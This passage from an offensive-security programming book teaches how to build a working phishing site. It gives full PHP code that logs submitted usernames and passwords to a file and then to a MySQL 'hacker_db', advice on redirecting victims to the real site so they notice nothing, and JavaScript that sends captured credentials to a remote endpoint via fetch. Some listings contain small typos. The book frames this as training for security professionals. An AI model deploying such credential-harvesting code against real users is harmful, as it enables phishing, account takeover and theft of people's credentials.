Just like that, you’re ready to capture some credentials! Save your server_side_boiler_plate.php file. It should look like Listing 1-4.

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Create a string with the form data.
    $formData = "Username: $username\nPassword: $password\n\n";

    // Specify the file to write the data to (change the path as needed).
    $filename = 'creds.txt';

    // Open the file for writing (create if it doesn't exist).
    $file = fopen($filename, 'a');

    if ($file) {
        // Write the form data to the file.
        fwrite($file, $formData);

        // Close the file.
        fclose($file);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Landing Page</title>
        <!-- Include Bootstrap CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/

Now you can start up a new PHP test server by using php -S localhost:8000. Load up your web page just like last time. It should render the same way as it has up to this point, but now when you submit a credential, the page refreshes and does nothing else.

On your server’s filesystem, you can see the new creds.txt file, which contains the credentials you submitted (in this case, admin and password123) in their nice, readable format:

Username: admin
Password: password123
When you submit more credentials to the form, the data should be appended to your file:

Username: admin
Password: password123

Username: test
Password: test123

Username: user
Password: user123

Username: root
Password: password
You can store as many credentials as your operating system has space for.

NOTE
You’ve probably noticed that I’ve been splitting this application into highly chunked sections instead of providing the full code example up front. My goal is for you to pace yourself and really grasp how and why you’re writing each component step-by-step. If you’ve successfully followed along up to this point, you should have a full understanding of each line in your program. Complete code examples are provided throughout each chapter if you do get stuck, and you can also view all the completed examples in the book’s GitHub repository at https://github.com/3ndG4me/Offensive-Security-Programming.

Creating a MySQL Database for Credential Storage
Text files work just fine for this simple use case, but there’s a lot to be said for using a database to store this kind of information. To showcase the robustness of databases for this and other applications, you’ll extend the credential-capturing functionality by using a MySQL database. You’ll be able to not only store credentials to be accessed later but also query the stored records to analyze data statistics, build reports, and even automate data accessibility across multiple applications. This is something you simply can’t do with a text file alone, at least not without writing a lot of logic to parse and handle yourself.

If you’re following along with this book’s setup, you should already have a MySQL database installed and running on port 3306. The credentials for this instance are stored in /etc/mysql/debian.cnf. You can access them by reading the file as follows:

$ sudo cat /etc/mysql/debian.cnf
host = localhost
user = debian-sys-maint
password = wZpHzJCepoKIpa7K
socket = /var/run/mysqld/mysqld.sock
The user is debian-sys-maint, and the password is a long, random string. In the real world, you want to keep these credentials top secret. In fact, the way you’ll reference them in your script here—by directly assigning them to variables inline—is not ideal for configuring credentials in PHP, but it’s fine for our proof-of-concept purposes or for temporary applications.

If you’re using a different setup for your database, you’ll probably be prompted to create credentials yourself. Using the root user for your application isn’t advisable, so if that’s the default you’re working with, create a new user that has permissions only for the database you’re going to create. If you wish to create your own credentials within the Ubuntu setup, run the following command:

$ sudo mysql_secure_installation utility
This will let you change the root password, and from there you can log in as root and create a new user like so:

$ mysql -u root -p
mysql> CREATE USER 'YOUR_USERNAME'@'localhost' IDENTIFIED BY 'YOUR_PASSWORD';
You can then give the new user permission to make changes to the database with the following commands:

mysql> GRANT CREATE, ALTER, DROP, INSERT, UPDATE, DELETE, SELECT, REFERENCES,
RELOAD on hacker_db.* TO 'YOUR_USERNAME'@'localhost' WITH GRANT OPTION;
This will give the user you create full privileges to a given database (hacker_db, which you’ll create shortly), but not to the rest of the MySQL server instance. Keep this in mind, since you may want to edit these permissions to make your user a bit more secure. It is usually a good idea to follow the principle of least privilege for creating database users by assigning them only the permissions that they need. It is important to note that you may encounter issues creating these permissions currently since the database doesn’t exist yet. If that is the case, come back to this step after you’ve created hacker_db with the root user, or the debian-sys-maint user if you are using the default configurations from the recommended tooling in “What You’ll Need to Follow Along” on page xxiii.

Now, to create the database and the table that you’ll work with in your application, you will need the following MySQL script:

# Create the database.
CREATE DATABASE hacker_db;

# Use the database.
USE hacker_db;

# Create a table to store the form data.
CREATE TABLE hacker_table(
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL
);
Structured Query Language (SQL) syntax is very declarative, which means that most commands are fairly self-explanatory and easy to read. The first line of this SQL script creates a new database called hacker_db, and the second line tells the script to begin using the database. This switches context so that any future commands you run will be executed to impact only hacker_db.

When you create the database table called hacker_table, the syntax gets a little more complicated. Table creation requires you to define the fields your table will be storing. In this case, the first column, called id, will be the primary key, a unique identifier that helps prevent data collisions and functions as an index for quick lookups. Instead of querying on a username of admin, for which there could be many entries, you can query on this specific ID that corresponds to a unique entry. This identifier is set to autoincrement, meaning each new entry will automatically be assigned an id value equal to the previous id + 1. This ensures that all primary keys are unique and prevents collisions as new data is stored. For your application, you can now query on id to quickly return anything from your first credential to your fiftieth, just by specifying a number.

This may seem fairly basic, but you can add other keys and identifier fields wherever you wish, so long as they are unique. For example, maybe your application allows only one user account per email address. This means that when you add data to your database, before creating a new user account, the application checks whether the email already exists in the database. If it does, the user account won’t be created. This way, you can use an email address as an effective index with which to query the database. This is beyond the scope of the current discussion, but it gives you a better idea of how powerful a real database backend can be.

In addition to this primary key, you define two more abstract columns: username and password. Both are of type VARCHAR (essentially a string in MySQL, to keep things simple) and neither can be NULL, hence the NOT NULL qualifier. The max length is determined by the parameter you pass in and can be any value from 0 to 65,535. In this case, it’s 255, which was the max size in older versions of MySQL and suffices for this use case. It’s highly unlikely that a user will provide a username or password longer than 255 characters (the average password length is currently 8 to 16 characters), but if they do, the data will be truncated to store only the max size the table allows.

Once you have a good grasp on those details, you should have all the information necessary to run your code. You can run MySQL commands in quite a few ways, but you’ll script this code out by pasting it in a text file and saving it as db_setup.sql and then calling it directly from the MySQL command line. Log in to your MySQL server like so (replacing username and password with either your own credentials or the debian-sys-maint ones shown earlier):

$ mysql -u username -p password
Then run the script by calling the source command as follows with the filepath on your server:

mysql> source path_to_db_setup.sql
This will automatically spin up your database and create your table.

If you want to do this line by line and see the creation output as it happens, simply log in and then write and execute each line as follows:

mysql> CREATE DATABASE hacker_db;
mysql> USE hacker_db;
mysql> CREATE TABLE hacker_table(
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL
);
Now you have a new database in your MySQL instance called hacker_db and a table called hacker_table ready to store usernames and passwords.

If you run the following query against this table, it should return an empty set to confirm that the table is, in fact, set up properly even though it has no data yet:

mysql> SELECT * FROM hacker_table;
Next, you need to reconfigure your PHP application to connect to the new database rather than writing to a file.

NOTE
Before proceeding, make sure you’ve installed the php-mysql libraries, which give PHP access to built-in MySQL functions so you can interact with a MySQL database. If you’re following the book’s dependencies and setup, you’ll already have these. Otherwise, you’ll need to set up PHP and MySQL by using instructions specific to your system.

You’ll start by defining parameters that are required for your MySQL connection. These include the inline variables that store your credentials (remember that defining these inline isn’t best practice for a real-world application). Add this code at the top of your PHP script, and resave the file as custom_phishing_page.php:

// Replace with your MySQL database credentials.
$host = "localhost";
$username = "debian-sys-maint";
$password = "your_password";
$database = "hacker_db";
The first parameter, $host, is the location of the database. Your MySQL database is listening on your localhost, or the same server that your web server is running on. If you needed to connect to a remote database, you would specify that hostname or Internet Protocol (IP) address in this parameter instead. Next are the $username and $password parameters that will be used to authenticate. Finally, the $database parameter indicates the database you want to connect to and use (in this case, hacker_db).

Now you need to create a MySQL connection object. Add this code below the parameters you just defined:

// Create a database connection.
$mysqli = new mysqli($host, $username, $password, $database);


// Check the connection.
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}
First, you instantiate a new variable called $mysqli and assign it to the new mysqli() object creation, to which you pass the $host, $username, $password, and $database parameters. After this, $mysqli->connect_error checks the connection; if this property contains any data, you know that the connection has likely failed in some way. If that happens, the die() function kills the PHP application and displays the $mysqli->connect_error value. Should you encounter any issues, this will allow you to debug the connection string as you develop.

At this point, you can start up the test PHP server again. Your goal is to load the page and see that there are no errors. You can even submit credential data and see the POST request go through, although nothing will happen since you’re not yet doing anything with those values. The point here is to verify that you’re not encountering any database connection errors and to confirm that your code is working so far.

Building a Phishing Website with Database Credential Storage
Now that your database is prepared, you’re ready to capture credentials and store them in the database. (Skip to Listing 1-5 for the completed full-stack application code.) To start, you need to bring back your request handler code from earlier. All the logic required to store the credentials will be contained in this conditional block. Add this code right after the lines where you just created your MySQL connection object:

if($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
Now you need to create a prepared statement, which prepares your query to be executed and binds your parameters to ensure that the data is properly sanitized. If you don’t do this step, someone could easily inject a payload such as 'OR SELECT 1 FROM hacker_table; and begin dumping the credentials you’ve worked so hard to capture. The last thing you want is for your phishing website to be vulnerable to a trivial SQL injection attack. You never want to cause your own data breach, even as an attacker.

There are quite a few ways to create prepared statements with the MySQL libraries, but you’ll use parameter binding. Add the following below your request handler code:

// Prepare and execute an INSERT statement to insert the data into a table.
    $stmt = $mysqli->prepare("INSERT INTO hacker_table (username, password) VALUES (?, ?)");
Inside your prepare() function call is your full SQL query plus some placeholder values that your data will be binding to. Specifying (?, ?) tells the function to map the first ? to the username value and the second ? to the password value. On the next line you “bind” these parameters, like so:

    $stmt->bind_param("ss", $username, $password);
The first parameter in the bind_param() function call, ss, tells the function that there are two values, both of which are strings. Then you pass in the username and password variables to be bound to those ? placeholders in your SQL statement. The end result ensures that any data passed in (even quotations or comment syntax) will be treated as a literal string value and be stored fully rather than being parsed as part of the MySQL query, thereby protecting the application from a SQL injection vulnerability.

From here, you’ll execute your query to store the data:

    if($stmt->execute()) {
        echo 'Data has been successfully inserted into the database.';
    } else {
        echo 'Error inserting data: ' . $stmt->error;
    }
The execute() function is built into your $stmt variable, since that variable is now referencing a prepared MySQL query object. Running $stmt->execute() will execute the query, and you wrap this in an if statement conditional check. If the statement returns without errors, the return value will evaluate to True in your conditional, letting you know the query ran successfully. Otherwise, the statement failed, and you can check the error. Save your file as custom_phishing_page.php, and it will be ready to run just as before, using the PHP server.

In a real deployment, you might want to simply return or exit after these steps so that you don’t display verbose success or error messages to the user. You could even get creative and redirect the user to the legitimate website you’re spoofing after you capture their credentials if that applies. This will make the user think that perhaps their login attempt just failed randomly and the page refreshed; then, when they log in to the real site and it works, they’ll be none the wiser and you’ll have their credentials.

The last step here is to close your database connection, freeing it up to handle more queries. This is a simple process:

// Close the statement and the database connection.
    $stmt->close();
    $mysqli->close();
}
This tells MySQL that you’re done executing your query and no longer need the database connection for this instance of the application.

NOTE
MySQL can manage multiple connections simultaneously, but the number that can be open at once is limited. For a large deployment, you’d want to increase this limit to the maximum that your hardware can handle. Even then, you’d want to make sure to close the connections when you’re done to prevent a denial of service on your database or a performance slowdown.

Your updated custom_phishing_page.php file should look like Listing 1-5.

<?php
// Replace with your MySQL database credentials.
$host = "localhost";
$username = "debian-sys-maint";
$password = "your_password";
$database = "hacker_db";

// Create a database connection.
$mysqli = new mysqli($host, $username, $password, $database);

// Check the connection.
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Prepare and execute an INSERT statement to insert the data into a table.
    $stmt = $mysqli->prepare("INSERT INTO hacker_table (username, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $username, $password);

    if ($stmt->execute()) {
        echo 'Data has been successfully inserted into the database.';
    } else {
        echo 'Error inserting data: ' . $stmt->error;
    }


    // Close the statement and the database connection.
    $stmt->close();
    $mysqli->close();

}


?>

Now load your application just as you did before, and type in some random username and password data. Then log in to your MySQL server via the command line again, and run the following queries:

mysql> use hacker_db;
mysql> select * from hacker_table;
You should see output similar to this, containing all the usernames and passwords you have entered:

+----+----------+-------------+

Congratulations! You’ve finished building not only a simple phishing website but also a full-stack application. It’s small, but you built your own frontend, wrote your own server-side code, and set up your own MySQL database. That’s everything you need to build full-stack applications, so you can take this knowledge further to create bigger, better applications and tools by learning web development in more depth. I strongly encourage you to do so; it will set you apart from other offensive security professionals and give you universal skills you can apply to any online application.

But you’re far from done here. As always, you still have much to learn! When we covered JavaScript earlier, I issued a challenge for you to try using fetch or XHR requests to send off data on your own. If you haven’t quite figured it out yet, not to worry; the next section will show you how it’s done.

Capturing Credentials with JavaScript
If you are interested in viewing the completed JavaScript data-capture code for context, skip ahead to Listings 1-6 and 1-7. You can capture data such as credentials by using nothing but JavaScript and a web server—no file writing, server-side code, or databases of any sort required. You’ll do so by taking advantage of standard web logging and a simple GET request.

First, you need to remove any PHP code and then add your JavaScript source reference back into your current landing page code above the Bootstrap and jQuery import:

script src="js_data_capture.js"></script>
Now remove the two console.log() calls from your previous script and replace them with the following code, which enables you to make a fetch request in JavaScript:

        // Send the data to another web server via a GET request.
        const url = 'http://localhost:8080'; // Replace with the actual endpoint URL.
This is a modern way to make web requests in JavaScript. You’ll fully implement the code, including the necessary function calls to handle responses, so you have everything you need to make a more robust GET request. That said, most of this code is unnecessary for this specific implementation. You’re defining the web server endpoint to which you’re making the request as a constant of url. In this case, the endpoint is a local web server that will be hosted on port 8080 via Python’s SimpleHTTPServer module.

Next, you’ll define your query parameters for the GET request. These are URI-formatted versions of the username and password values you captured from the form by using JavaScript already. Add this code below the const url line:

const queryParams = `username${encodeURIComponent(username)}$password=
                    ${encodeURIComponent(password)}`
The encodeURIComponent() function, which is built into JavaScript, will encode any noncompliant string values so that they don’t interfere with your URI string in the final web request. Note that GET requests can store only so many characters in the URI. For large datasets, sending requests over GET may not work out, because GET parameters are sent via the URL when you request a page in the browser. Sending data via the request URL has size limitations that typically range from 2,048 to 8,192 bytes, which is much too small for larger datasets like files. Using a POST request is the solution to this issue, as POST requests send data via the body of a request as opposed to the URL. A request body has much larger size limitations that are configurable server-side by whatever web server is being used. Additionally, it’s best practice to send authentication requests via POST as sending data like a password via GET will expose it in the logs of most web servers, which could expose the plaintext credentials to developers and potential attackers alike. In this example case, however, you actually want to capture that plaintext data, so a GET request will work well and keep the request simple.

To begin building out the request by using fetch, add the following:

    fetch(`${url}?$(queryParams}`, {
        method: 'GET',
        headers: {
        'Content-Type': 'application/json', // Adjust content type as needed.
        },
    })
    .then(response => response.json())
    .then(data => {
        // Handle the response from the other server.
        console.log('Response from server:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
Your updated js_data_capture.js file should look like Listing 1-6.

document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    // Get the values from the form fields.
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Output the data to console.log for debugging.
    console.log('Username:', username);
    console.log('Password:', password);

    // Send the data to another web server via a GET request.
    const url = 'http://localhost:8080'; // Replace with the actual endpoint URL.
    const queryParams = `username=${encodeURIComponent(username)}$password=
                        ${encodeURIComponent(password)}`;

    fetch(`${url}?${queryParams}`, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json', // Adjust the content type as needed.
        },
    })
    .then(response => response.json())
    .then(data => {
        // Handle the response from the other server.
        console.log('Response from server:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
Listing 1-6: The complete JavaScript code for remote credential harvesting

In the next step, you’ll serve your web page and web server by using the simple Python HTTP server. This is just a quick and dirty way of standing up a local HTTP server, much as you did with PHP. This web server will log requests sent to it in real time, which means you’ll see the incoming credentials displayed in the console whenever a request is made. If you use a real web server like Apache or nginx for this, these request logs will be stored in their default request logfile for the respective web server type, meaning your proof of concept will work on any standard web server without requiring any additional logging or configuration.

It’s also worth noting that these credentials will be stored in plaintext regardless of whether a server is using Transport Layer Security (TLS). Most web servers purposely don’t log the full POST request body, as sensitive data like credentials or payment information is often sent with POST requests, not GET requests. You can change this setting by editing the logging verbosity, but by default POST requests would not be logged. GET requests, on the other hand, are always logged.

Think about this the next time you enter a password or other sensitive data into a web page that is sent as a GET request. This data is not encrypted or secured on the backend, only in transit if TLS is configured. As an example, if a form were to submit a username as a GET and a password via POST, but a user accidentally types their password into the username field, that password would end up stored in the web request logs in plaintext until the log was deleted. The implications can be quite severe and demonstrate why it’s inadvisable to send sensitive information like session tokens and passwords via a URL, even if they’re hashed or encrypted in some way.

First, verify that your final landing_page.html code matches Listing 1-7.
